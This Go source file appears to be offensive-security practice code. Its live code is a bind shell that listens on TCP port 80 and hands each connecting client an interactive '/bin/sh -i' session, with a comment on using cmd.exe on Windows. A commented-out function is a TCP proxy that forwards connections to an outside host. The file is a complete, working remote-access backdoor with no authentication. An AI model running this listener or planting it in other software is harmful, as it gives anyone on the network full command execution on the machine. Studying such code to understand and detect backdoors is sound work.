package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

// func handle(src net.Conn) {
// 	dst, err := net.Dial("tcp", "joescatcam.website:80")
// 	if err != nil {
// 		log.Fatalln("Unable to connect to our unreachable host")
// 	}
// 	defer dst.Close()

// 	go func() {
// 		if _, err := io.Copy(dst, src); err != nil {
// 			log.Fatalln(err)
// 		}
// 	}()
// 	if _, err := io.Copy(src, dst); err != nil {
// 		log.Fatalln(err)
// 	}
// }

func handle(conn net.Conn) {

	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	// cmd := exec.Command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":80")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		go handle(conn)
	}
}
